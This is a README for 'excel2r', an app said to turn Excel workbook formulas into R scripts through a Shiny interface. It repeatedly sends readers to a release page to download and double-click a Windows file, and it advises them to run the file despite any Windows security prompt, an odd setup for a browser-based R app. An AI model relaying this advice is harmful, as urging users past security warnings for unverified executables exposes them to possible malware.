# 📊 excel2r - Turn Excel formulas into R code

[![Download excel2r](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Freemanm2767/excel2r/releases)

## 🧰 What excel2r does

excel2r takes formulas from an Excel workbook and turns them into a standalone R script.  
It is built for people who need to move spreadsheet logic into R without rewriting every formula by hand.

You can upload a multi-tab `.xlsx` file, let the app map supported Excel functions, and get output that you can run in R. The app uses a Shiny web interface, so you work through a browser instead of a command line.

## 🚀 Download and install

Visit this page to download: https://github.com/Freemanm2767/excel2r/releases

1. Open the release page in your browser.
2. Find the latest release at the top of the page.
3. Download the Windows file from the Assets section.
4. Save the file to a folder you can find later, such as Downloads or Desktop.
5. Double-click the file to start the app.

If Windows shows a security prompt, choose the option to run the file.

## 💻 Windows requirements

Before you run excel2r on Windows, make sure you have:

- Windows 10 or Windows 11
- A modern web browser such as Chrome, Edge, or Firefox
- Enough free space for your Excel files and output scripts
- Permission to open downloaded files on your PC

For best results, use Excel workbooks saved as `.xlsx` files. The app is built for multi-tab workbooks and works best when formulas are laid out in a normal sheet structure.

## 📁 What you need before you start

Have these files ready:

- The Excel workbook you want to convert
- Any related data files used by the workbook
- A folder where you want to save the generated `.R` script

If your workbook has several tabs, that is fine. excel2r is designed for that setup. Keep the workbook closed before you upload it.

## 🖱️ How to use the app

1. Open excel2r after you download it.
2. Wait for the Shiny app to load in your browser.
3. Click the upload area.
4. Select your `.xlsx` workbook.
5. Let the app read the workbook sheets and formulas.
6. Review the mapped Excel functions.
7. Export the generated R script.
8. Save the `.R` file in a folder you can reach later.
9. Open the script in R or RStudio if you want to run or edit it.

The app is meant to keep the process simple. You do not need to write code to start.

## 🧩 How the conversion works

excel2r reads the formulas in your workbook and matches them to R code.  
It includes 62 Excel function mappings, which helps cover many common spreadsheet formulas.

The app works best when your workbook uses standard Excel functions such as:

- Math and rounding formulas
- Text cleanup formulas
- Logical formulas
- Lookup-style formulas
- Date and time formulas

For formulas that have a direct match, the app builds R code that follows the same logic. For workbook parts that depend on sheet references, the app keeps the structure so the result stays useful in R.

## 📊 Supported workbook use cases

excel2r is a good fit for:

- Finance models
- Reporting workbooks
- Analysis files with several tabs
- Internal tools built in Excel
- Repeated spreadsheet logic that needs to move into R

It is useful when you want to take a workbook that works in Excel and reuse the same logic in an R workflow. This can save time when you need a script instead of a spreadsheet.

## 🧪 Best results for your workbook

Use a cleaner workbook when possible. The app handles formulas best when:

- Each tab has a clear purpose
- Formulas follow a regular pattern
- Cell references are not mixed with too many manual edits
- Names and labels are easy to read
- The workbook is saved as `.xlsx`

If your workbook uses merged cells, unusual formatting, or many manual overrides, check the output with care. Simple workbook design gives the cleanest R script.

## 🛠️ What the output looks like

After conversion, excel2r gives you a standalone `.R` script.  
That script is meant to run in R without the original Excel file.

The script can include:

- Converted formulas
- Sheet-based logic
- Reusable R expressions
- Structured code that follows your workbook layout

You can open the script in RStudio, review it, and make changes if needed. This makes it easier to move from spreadsheet work to R-based analysis.

## 📌 Common Excel functions included

The app includes mappings for many common Excel functions. Some examples are:

- `IF`
- `AND`
- `OR`
- `SUM`
- `AVERAGE`
- `ROUND`
- `LEFT`
- `RIGHT`
- `MID`
- `LEN`
- `CONCAT`
- `TEXT`
- `DATE`
- `TODAY`
- `VLOOKUP`
- `INDEX`
- `MATCH`

This list gives a sense of the function coverage. The full app includes 62 mappings to support a broad set of spreadsheet tasks.

## 🧭 Simple workflow

A plain workflow helps most users:

1. Download the app from the release page.
2. Open excel2r on Windows.
3. Upload your `.xlsx` workbook.
4. Review the converted logic.
5. Export the `.R` script.
6. Run the script in R if needed.

If you work with the same workbook type often, save your output scripts in a named folder so you can find them later.

## 🔒 File safety and local use

excel2r works with files you choose to upload. Keep your workbook in a folder you trust. If the app creates output files, save them in a location you control.

When working with sensitive data, use a local copy of the workbook and store the output in a private folder on your computer.

## 🧰 Troubleshooting

If the app does not start:

- Make sure the download finished
- Check that you opened the correct file from the release page
- Try running the file again
- Restart your browser
- Reboot Windows if the app still will not open

If your workbook does not load:

- Confirm the file is `.xlsx`
- Close the workbook in Excel before uploading
- Check that the file is not damaged
- Try a smaller workbook first

If the output script seems incomplete:

- Review the workbook for unsupported formulas
- Check tabs with unusual layouts
- Test with a simpler workbook
- Compare a few formulas with the output script

If Windows blocks the file:

- Use the file from the official release page
- Check the file name and extension
- Open the file from your Downloads folder again

## 🧾 Tips for better conversion

- Save the workbook before uploading it
- Keep formulas in visible cells where possible
- Avoid extra blank tabs
- Use standard Excel function names
- Keep sheet names simple
- Test one workbook at a time

These steps help the app read the workbook with less friction and produce a cleaner script.

## 📂 Suggested folder setup

A simple folder setup can help you stay organized:

- `Downloads` for the app file
- `Excel Files` for source workbooks
- `R Scripts` for exported files
- `Archive` for old versions

This makes it easier to find the workbook, the app, and the generated `.R` file later.

## 🧪 Example use case

You have a monthly reporting workbook with several tabs. One tab holds raw data, another calculates totals, and another builds summary values. Instead of keeping the logic only in Excel, you upload the workbook to excel2r. The app reads the formulas, maps the supported Excel functions, and gives you an R script that follows the same flow. You can then use that script in an R project and keep your report logic in one place

## 🖥️ Launching the app again

After the first run, you can open excel2r again from the downloaded file. Keep the file in a fixed folder if you plan to use it often. If you want quick access, create a shortcut on your desktop after the first launch

## 📥 Download link

Visit this page to download: https://github.com/Freemanm2767/excel2r/releases

## 📌 File types

Use these file types with excel2r:

- Input: `.xlsx`
- Output: `.R`

If you have older Excel files, save them as `.xlsx` before uploading. That gives the app the best chance to read the workbook correctly.

## 🔧 Working with R after export

After you export the script, you can:

- Open it in RStudio
- Read through the generated code
- Run it in your R session
- Edit a few lines to fit your data
- Save the script with a clear name

If you already use R for analysis, this gives you a way to move spreadsheet logic into the same work area

## 📦 Release page

The release page is the place to get the Windows download and any future updates:

https://github.com/Freemanm2767/excel2r/releases

Keep that page bookmarked if you plan to install a new version later